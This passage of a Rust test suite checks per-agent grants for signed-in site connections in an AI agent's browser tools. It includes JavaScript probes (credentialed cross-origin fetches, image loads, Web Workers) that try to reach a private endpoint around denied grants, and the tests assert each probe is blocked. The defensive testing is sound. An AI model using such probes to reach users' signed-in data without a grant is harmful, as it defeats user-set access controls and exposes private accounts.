                    counter.fetch_add(1, Ordering::SeqCst);
                    if headers
                        .get(header::COOKIE)
                        .and_then(|value| value.to_str().ok())
                        .is_some_and(|value| {
                            value.contains("ordinary=STILL_SIGNED_IN_CONNECTION_DOC")
                        })
                    {
                        cookies.fetch_add(1, Ordering::SeqCst);
                    }
                    (
                        [(
                            header::SET_COOKIE,
                            "ordinary=STILL_SIGNED_IN_CONNECTION_DOC; HttpOnly; Path=/",
                        )],
                        Html("<h1>Signed in</h1><a href='/logout'>Sign out</a>"),
                    )
                }
            }),
        )
        .route(
            "/outside",
            get(move || {
                let link = link.clone();
                async move { Html(link) }
            }),
        )
        .route(
            "/frame",
            get(move || {
                let frame = frame.clone();
                async move { Html(frame) }
            }),
        );
    let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let first = daemon
        .shared
        .connections
        .record(crate::connections::Record {
            site: "localhost",
            keys: &[],
            source: ConnectionSource::Login,
            status: ConnectionStatus::Active,
            identity: Some("first@example.com"),
            identity_source: ConnectionIdentitySource::LoginTicket,
            home: Some(&bank),
            session: None,
            agent: "chief",
            vault_item: None,
            account_space: None,
        })
        .unwrap();
    let second = daemon
        .shared
        .connections
        .record(crate::connections::Record {
            site: "localhost",
            keys: &[],
            source: ConnectionSource::Login,
            status: ConnectionStatus::Active,
            identity: Some("second@example.com"),
            identity_source: ConnectionIdentitySource::LoginTicket,
            home: Some(&bank),
            session: None,
            agent: "mina",
            vault_item: None,
            account_space: None,
        })
        .unwrap();
    assert_ne!(first.id, second.id);
    let set = |row: &Connection, access| {
        daemon
            .shared
            .connections
            .update(
                &row.id,
                UpdateConnectionRequest {
                    grants: Some(vec![ConnectionGrant {
                        agent_id: "mina".into(),
                        access,
                    }]),
                    home_url: None,
                },
            )
            .unwrap()
    };
    set(&first, ConnectionAccess::Denied);
    let space = daemon
        .shared
        .connections
        .record(crate::connections::Record {
            site: "localhost",
            keys: &[],
            source: ConnectionSource::Login,
            status: ConnectionStatus::Active,
            identity: None,
            identity_source: ConnectionIdentitySource::None,
            home: Some(&bank),
            session: None,
            agent: "chief",
            vault_item: None,
            account_space: Some("separate-test-space"),
        })
        .unwrap();
    set(&space, ConnectionAccess::Denied);
    assert_eq!(
        daemon
            .shared
            .connections
            .shared_site("localhost")
            .unwrap()
            .len(),
        2
    );

    let denied = tool(
        &daemon,
        session,
        "browser_open_tab",
        json!({"url":bank}),
        "denied-plain-open",
    )
    .await;
    assert!(
        matches!(&denied,ToolOutcome::Denied {reason,..} if reason=="connection_denied"),
        "{denied:?}"
    );
    assert_eq!(hits.load(Ordering::SeqCst), 0);
    let chief = daemon.shared.agents.get("chief").unwrap().unwrap();
    let chief_tab =
        super::browser::open_tab(&daemon, &chief.home_session_id, &bank, "api-chief-document")
            .await;
    assert!(!chief_tab.is_empty());
    assert_eq!(hits.load(Ordering::SeqCst), 1);
    let outside_tab = super::browser::open_tab(
        &daemon,
        session,
        &format!("{outside}/outside"),
        "unrelated-document",
    )
    .await;
    assert_eq!(hits.load(Ordering::SeqCst), 1);
    let reference =
        super::browser::reference(&daemon, session, &outside_tab, "Bank", "bank-link").await;
    assert!(
        matches!(tool(&daemon,session,"browser_act",json!({"tab_id":outside_tab,"target":reference,"action":"click"}),"denied-click").await,
        ToolOutcome::Denied {reason,..} if reason=="connection_denied")
    );
    let _ = model(
        tool(
            &daemon,
            session,
            "browser_navigate",
            json!({"tab_id":outside_tab,"url":format!("{outside}/outside")}),
            "reset-outside",
        )
        .await,
    );
    assert!(
        matches!(tool(&daemon,session,"browser_repl",json!({"tab_id":outside_tab,"code":format!("await page.goto({})",json!(bank))}),"denied-repl").await,
        ToolOutcome::Denied {reason,..} if reason=="connection_denied")
    );
    assert_eq!(hits.load(Ordering::SeqCst), 1);
    assert!(
        matches!(tool(&daemon,session,"browser_open_tab",json!({"url":format!("{outside}/frame")}),"denied-frame").await,
        ToolOutcome::Denied {reason,..} if reason=="connection_denied")
    );
    assert_eq!(hits.load(Ordering::SeqCst), 1);

    let _ = model(
        tool(
            &daemon,
            session,
            "browser_navigate",
            json!({"tab_id":outside_tab,"url":format!("{outside}/outside")}),
            "requester-outside",
        )
        .await,
    );
    set(&first, ConnectionAccess::Ask);
    set(&second, ConnectionAccess::Ask);
    let mut events = daemon.shared.events.subscribe();
    let blocked = model(
        tokio::time::timeout(
            Duration::from_secs(5),
            tool(
                &daemon,
                session,
                "browser_open_tab",
                json!({"url":bank}),
                "ask-plain-open",
            ),
        )
        .await
        .unwrap(),
    );
    assert_eq!(blocked["status"], "blocked");
    assert_eq!(blocked["error"], "connection_grant_required");
    let tab = blocked["tab_id"].as_str().unwrap();
    let ticket = document_ticket(&mut events, session).await;
    assert!(ticket
        .tool_call_id
        .starts_with(crate::tools::API_CALL_PREFIX));
    assert!(ticket.summary.contains(&outside), "{ticket:?}");
    for row in [&first, &second] {
        assert!(ticket.tool.as_ref().unwrap().args["connection_ids"]
            .as_array()
            .unwrap()
            .iter()
            .any(|id| id == &json!(row.id)));
        assert!(ticket
            .instructions
            .as_deref()
            .unwrap()
            .contains(row.identity.as_deref().unwrap()));
    }
    let repeated = model(
        tool(
            &daemon,
            session,
            "browser_navigate",
            json!({"tab_id":tab,"url":bank}),
            "ask-repeat",
        )
        .await,
    );
    assert_eq!(repeated["error"], "connection_grant_required");
    let duplicate = model(
        tool(
            &daemon,
            session,
            "connection_open",
            json!({"connection_id":first.id}),
            "ask-tool-dedup",
        )
        .await,
    );
    assert_eq!(duplicate["error"], "connection_grant_required");
    assert_eq!(
        daemon
            .shared
            .db
            .state(session)
            .await
            .unwrap()
            .tickets
            .values()
            .filter(|ticket| ticket.status == TicketStatus::Pending
                && crate::tools::connections::is_grant_ticket(ticket))
            .count(),
        1
    );
    answer(&daemon, &ticket.id, json!("once")).await;
    let wrong = model(
        tool(
            &daemon,
            session,
            "browser_navigate",
            json!({"tab_id":outside_tab,"url":bank}),
            "once-wrong-tab",
        )
        .await,
    );
    assert_eq!(wrong["error"], "connection_grant_required");
    let wrong_ticket = document_ticket(&mut events, session).await;
    answer(&daemon, &wrong_ticket.id, json!("reject")).await;
    assert_eq!(hits.load(Ordering::SeqCst), 1);
    assert_eq!(
        model(
            tool(
                &daemon,
                session,
                "browser_navigate",
                json!({"tab_id":tab,"url":bank}),
                "once-navigation"
            )
            .await
        )["url"],
        bank
    );
    assert_eq!(hits.load(Ordering::SeqCst), 2);
    let spent = model(
        tool(
            &daemon,
            session,
            "browser_navigate",
            json!({"tab_id":tab,"url":bank}),
            "once-spent",
        )
        .await,
    );
    assert_eq!(spent["error"], "connection_grant_required");
    assert_eq!(hits.load(Ordering::SeqCst), 2);
    let always = document_ticket(&mut events, session).await;
    answer(&daemon, &always.id, json!("always")).await;
    for row in [&first, &second] {
        assert!(daemon
            .shared
            .connections
            .get(&row.id)
            .unwrap()
            .unwrap()
            .grants
            .iter()
            .any(|grant| grant.agent_id == "mina" && grant.access == ConnectionAccess::Allowed));
    }
    assert_eq!(
        model(
            tool(
                &daemon,
                session,
                "browser_navigate",
                json!({"tab_id":tab,"url":bank}),
                "always-navigation"
            )
            .await
        )["url"],
        bank
    );
    assert_eq!(hits.load(Ordering::SeqCst), 3);
    assert!(authenticated.load(Ordering::SeqCst) >= 2);
    set(&first, ConnectionAccess::Ask);
    set(&second, ConnectionAccess::Ask);
    let ToolOutcome::Deferred {
        ticket: combined, ..
    } = tool(
        &daemon,
        session,
        "connection_open",
        json!({"connection_id":first.id}),
        "combined-tool-grant",
    )
    .await
    else {
        panic!("combined tool grant missing")
    };
    let combined_ticket = daemon.shared.db.state(session).await.unwrap().tickets[&combined].clone();
    assert_eq!(
        combined_ticket.tool.as_ref().unwrap().args["connection_ids"]
            .as_array()
            .unwrap()
            .len(),
        2
    );
    answer(&daemon, &combined, json!("once")).await;
    assert_eq!(
        model(
            tool(
                &daemon,
                session,
                "connection_open",
                json!({"connection_id":first.id}),
                "combined-once-handoff"
            )
            .await
        )["tab_id"],
        tab
    );
    assert_eq!(hits.load(Ordering::SeqCst), 4);
    assert_eq!(
        daemon
            .shared
            .db
            .state(session)
            .await
            .unwrap()
            .tickets
            .values()
            .filter(|ticket| ticket.status == TicketStatus::Pending
                && crate::tools::connections::is_grant_ticket(ticket))
            .count(),
        0
    );
    let browser = daemon
        .shared
        .registry
        .browser
        .for_tab(&daemon.shared, session, tab)
        .await
        .map_err(|error| error.0)
        .unwrap();
    let mut retired = mina.clone();
    retired.status = AgentStatus::Retired;
    daemon.shared.agents.put(&retired, "retired").unwrap();
    assert!(matches!(
        browser.navigate(session.as_str(), tab, &bank).await,
        Err(openside_browser::BrowserError::ConnectionDenied)
    ));
    assert_eq!(hits.load(Ordering::SeqCst), 4);
    daemon.shared.agents.put(&mina, "active").unwrap();
    set(&first, ConnectionAccess::Denied);
    assert!(
        matches!(tool(&daemon,session,"browser_navigate",json!({"tab_id":tab,"url":bank}),"denied-wins").await,
        ToolOutcome::Denied {reason,..} if reason=="connection_denied")
    );
    for row in [&first, &second] {
        let response = api::router(daemon.shared.clone(), true)
            .oneshot(request(
                "POST",
                &format!("/v1/connections/{}/revoke", row.id),
                json!({"sign_out":false}),
                None,
            ))
            .await
            .unwrap();
        let status = response.status();
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            status,
            StatusCode::NO_CONTENT,
            "revoking {}: {}",
            row.id,
            String::from_utf8_lossy(&body)
        );
    }
    assert!(daemon
        .shared
        .connections
        .shared_site("localhost")
        .unwrap()
        .is_empty());
    assert!(
        !super::browser::open_tab(&daemon, session, &bank, "forgotten-normal-site")
            .await
            .is_empty()
    );
    assert_eq!(hits.load(Ordering::SeqCst), 5);
    assert!(authenticated.load(Ordering::SeqCst) >= 4);
    daemon.shutdown().await;
    server.abort();
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn connection_tools_check_retries_the_same_once_authorized_probe_tab() {
    use axum::{response::Html, routing::get, Router};
    use std::sync::atomic::{AtomicUsize, Ordering};
    let root = tempfile::tempdir().unwrap();
    let daemon = Daemon::open_runtime(config(root.path()).await, TestRuntime::default())
        .await
        .unwrap();
    let draft: HireDraft = serde_json::from_value(
        json!({"name":"Mina","persona":{"role":"Checks sites","responsibilities":["Check sites"]}}),
    )
    .unwrap();
    let mina = crate::agents::create(&daemon.shared, &draft, "mina")
        .await
        .unwrap_or_else(|error| panic!("{}", error.1));
    let session = &mina.home_session_id;
    let hits = Arc::new(AtomicUsize::new(0));
    let counter = hits.clone();
    let app = Router::new().route(
        "/",
        get(move || {
            let counter = counter.clone();
            async move {
                counter.fetch_add(1, Ordering::SeqCst);
                (
                    [("set-cookie", "probe=SIGNED_IN_PROBE; HttpOnly; Path=/")],
                    Html("<h1>Signed in</h1><a href='/logout'>Sign out</a>"),
                )
            }
        }),
    );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let home = format!(
        "http://localhost:{}/",
        listener.local_addr().unwrap().port()
    );
    let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let row = record(&daemon, "localhost", &home, "chief");
    let mut events = daemon.shared.events.subscribe();
    let blocked = model(
        tool(
            &daemon,
            session,
            "connection_check",
            json!({"connection_id":row.id}),
            "probe-ask",
        )
        .await,
    );
    assert_eq!(blocked["error"], "connection_grant_required");
    assert_eq!(hits.load(Ordering::SeqCst), 0);
    let tab = blocked["tab_id"].as_str().unwrap();
    let ticket = document_ticket(&mut events, session).await;
    assert_eq!(ticket.tool.as_ref().unwrap().args["navigation_tab_id"], tab);
    answer(&daemon, &ticket.id, json!("once")).await;
    let checked = model(
        tool(
            &daemon,
            session,
            "connection_check",
            json!({"connection_id":row.id}),
            "probe-once-retry",
        )
        .await,
    );
    assert_eq!(checked["id"], row.id);
    assert_eq!(checked["status"], "active");
    assert_eq!(hits.load(Ordering::SeqCst), 1);
    let browser = daemon
        .shared
        .registry
        .browser
        .get(&daemon.shared)
        .await
        .map_err(|error| error.0)
        .unwrap();
    assert!(!browser.tabs().await.iter().any(|current| current.id == tab));
    assert_eq!(
        daemon
            .shared
            .db
            .state(session)
            .await
            .unwrap()
            .tickets
            .values()
            .filter(|ticket| ticket.status == TicketStatus::Pending
                && crate::tools::connections::is_grant_ticket(ticket))
            .count(),
        0
    );
    daemon.shutdown().await;
    server.abort();
}

async fn change_grant(daemon: &Daemon, row: &Connection, agent: &str, access: ConnectionAccess) {
    let response = api::router(daemon.shared.clone(), true)
        .oneshot(request(
            "PATCH",
            &format!("/v1/connections/{}", row.id),
            json!({"grants":[{"agent_id":agent,"access":access}]}),
            None,
        ))
        .await
        .unwrap();
    assert_eq!(
        response.status(),
        StatusCode::OK,
        "{}",
        json_body(response).await
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn connection_tools_full_request_isolation_downgrade_sibling_worker_and_document_lifetime() {
    use axum::{
        http::HeaderMap,
        response::{Html, IntoResponse},
        routing::get,
        Router,
    };
    use std::sync::atomic::{AtomicUsize, Ordering};
    let root = tempfile::tempdir().unwrap();
    let daemon = Daemon::open_runtime(config(root.path()).await, TestRuntime::default())
        .await
        .unwrap();
    let draft:HireDraft=serde_json::from_value(json!({"name":"Mina","persona":{"role":"Checks sites","responsibilities":["Check signed-in sites"]}})).unwrap();
    let mina = crate::agents::create(&daemon.shared, &draft, "mina")
        .await
        .unwrap_or_else(|error| panic!("{}", error.1));
    let session = &mina.home_session_id;
    let private = Arc::new(AtomicUsize::new(0));
    let counter = private.clone();
    let app = Router::new()
        .route(
            "/bank",
            get(|| async {
                (
                    [(
                        "set-cookie",
                        "private=SIGNED_IN_ISOLATION; HttpOnly; Path=/",
                    )],
                    Html("<h1>Signed in</h1><a href='/logout'>Sign out</a>"),
                )
            }),
        )
        .route("/outside", get(|| async { Html("<h1>Outside</h1>") }))
        .route(
            "/outside2",
            get(|| async { Html("<h1>Another document</h1>") }),
        )
        .route(
            "/private",
            get(move |headers: HeaderMap| {
                let counter = counter.clone();
                async move {
                    counter.fetch_add(1, Ordering::SeqCst);
                    let origin = headers
                        .get("origin")
                        .and_then(|value| value.to_str().ok())
                        .unwrap_or("*")
                        .to_owned();
                    (
                        [
                            ("access-control-allow-origin", origin),
                            ("access-control-allow-credentials", "true".into()),
                        ],
                        "real-private-response",
                    )
                        .into_response()
                }
            }),
        );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let sibling_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://localhost:{}", listener.local_addr().unwrap().port());
    let sibling = format!(
        "http://localhost:{}",
        sibling_listener.local_addr().unwrap().port()
    );
    let outside = origin.replace("localhost", "127.0.0.1");
    let sibling_app = app.clone();
    let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let sibling_server =
        tokio::spawn(async move { axum::serve(sibling_listener, sibling_app).await.unwrap() });
    let row = record(&daemon, "localhost", &format!("{origin}/bank"), "mina");
    let bank_tab = super::browser::open_tab(
        &daemon,
        session,
        &format!("{origin}/bank"),
        "allowed-bank-tab",
    )
    .await;
    let other_tab = super::browser::open_tab(
        &daemon,
        session,
        &format!("{outside}/outside"),
        "allowed-other-tab",
    )
    .await;
    let chief = daemon.shared.agents.get("chief").unwrap().unwrap();
    let chief_tab = super::browser::open_tab(
        &daemon,
        &chief.home_session_id,
        &format!("{origin}/bank"),
        "api-chief-isolation",
    )
    .await;
    let browser = daemon
        .shared
        .registry
        .browser
        .for_tab(&daemon.shared, session, &bank_tab)
        .await
        .map_err(|error| error.0)
        .unwrap();
    assert_eq!(
        browser
            .evaluate(&bank_tab, "fetch('/private').then(r=>r.text())")
            .await
            .unwrap(),
        "real-private-response"
    );
    assert_eq!(private.load(Ordering::SeqCst), 1);

    change_grant(&daemon, &row, "mina", ConnectionAccess::Denied).await;
    assert!(!browser.tabs().await.iter().any(|tab| tab.id == bank_tab));
    assert!(matches!(tool(&daemon,session,"browser_repl",json!({"tab_id":bank_tab,"code":"await page.evaluate(() => fetch('/private').then(r=>r.text()))"}),"closed-bank-fetch").await,ToolOutcome::Denied{..}));
    let xhr=format!("await page.evaluate(() => fetch({}, {{credentials:'include'}}).then(r=>r.text()).catch(()=> 'blocked'))",json!(format!("{sibling}/private")));
    assert!(
        matches!(tool(&daemon,session,"browser_repl",json!({"tab_id":other_tab,"code":xhr}),"denied-sibling-xhr").await,
        ToolOutcome::Denied{reason,..} if reason=="connection_denied")
    );
    let image=format!("await page.evaluate(() => new Promise(resolve => {{const image=new Image(); image.onload=()=>resolve(true); image.onerror=()=>resolve(false); image.src={}; document.body.append(image);}}))",json!(format!("{sibling}/private?image=1")));
    assert!(
        matches!(tool(&daemon,session,"browser_repl",json!({"tab_id":other_tab,"code":image}),"denied-sibling-image").await,
        ToolOutcome::Denied{reason,..} if reason=="connection_denied")
    );
    let worker_source=format!("onmessage=async()=>{{try{{const response=await fetch({},{{credentials:'include'}});postMessage(await response.text())}}catch{{postMessage('blocked')}}}}",json!(format!("{sibling}/private")));
    browser.record_protocol(true);
    let worker=format!("await page.evaluate(() => new Promise(resolve => {{const worker=new Worker(URL.createObjectURL(new Blob([{}],{{type:'text/javascript'}})));globalThis.isolationWorker=worker;worker.onmessage=event=>resolve(event.data);worker.postMessage('go');}}))",json!(worker_source));
    let worker_result = tokio::time::timeout(
        Duration::from_secs(5),
        tool(
            &daemon,
            session,
            "browser_repl",
            json!({"tab_id":other_tab,"code":worker}),
            "denied-worker",
        ),
    )
    .await;
    assert!(
        worker_result.is_ok(),
        "worker admission did not finish: {:?}",
        browser.take_protocol_log()
    );
    assert!(
        matches!(worker_result.unwrap(),ToolOutcome::Denied{reason,..} if reason=="connection_denied")
    );
    assert_eq!(private.load(Ordering::SeqCst), 1);
    assert_eq!(
        browser
            .evaluate(
                &chief_tab,
                &format!(
                    "fetch({},{{credentials:'include'}}).then(r=>r.text())",
                    json!(format!("{sibling}/private"))
                )
            )
            .await
            .unwrap(),
        "real-private-response"
    );
    browser
        .evaluate(&other_tab, "globalThis.isolationWorker.terminate();null")
        .await
        .unwrap();
    assert_eq!(private.load(Ordering::SeqCst), 2);

    change_grant(&daemon, &row, "mina", ConnectionAccess::Ask).await;
    let mut events = daemon.shared.events.subscribe();
    let blocked = model(
        tool(
            &daemon,
            session,
            "browser_repl",
            json!({"tab_id":other_tab,"code":xhr}),
            "ask-resource",
        )
        .await,
    );
    assert_eq!(blocked["error"], "connection_grant_required");
    let ticket = document_ticket(&mut events, session).await;
    answer(&daemon, &ticket.id, json!("once")).await;
    for id in ["once-resource", "once-second-resource"] {
        let fetched = model(
            tool(
                &daemon,
                session,
                "browser_repl",
                json!({"tab_id":other_tab,"code":xhr}),
                id,
            )
            .await,
        );
        assert_eq!(
            fetched["return_value"], "real-private-response",
            "{fetched}"
        );
    }
    assert_eq!(private.load(Ordering::SeqCst), 4);
    assert!(
        matches!(tool(&daemon,session,"connection_fetch",json!({"connection_id":row.id,"tab_id":other_tab,"method":"GET","path":"/private"}),"wrong-origin-connection-fetch").await,
        ToolOutcome::Denied{reason,..} if reason=="connection_cross_site")
    );
    let _ = model(
        tool(
            &daemon,
            session,
            "browser_navigate",
            json!({"tab_id":other_tab,"url":format!("{outside}/outside2")}),
            "new-document",
        )
        .await,
    );
    let expired = model(
        tool(
            &daemon,
            session,
            "browser_repl",
            json!({"tab_id":other_tab,"code":xhr}),
            "expired-document-grant",
        )
        .await,
    );
    assert_eq!(expired["error"], "connection_grant_required");
    assert_eq!(private.load(Ordering::SeqCst), 4);
    let always = document_ticket(&mut events, session).await;
    answer(&daemon, &always.id, json!("always")).await;
    assert_eq!(
        model(
            tool(
                &daemon,
                session,
                "browser_repl",
                json!({"tab_id":other_tab,"code":xhr}),
                "always-resource"
            )
            .await
        )["return_value"],
        "real-private-response"
    );
    assert_eq!(private.load(Ordering::SeqCst), 5);
    daemon.shutdown().await;
    server.abort();
    sibling_server.abort();
}
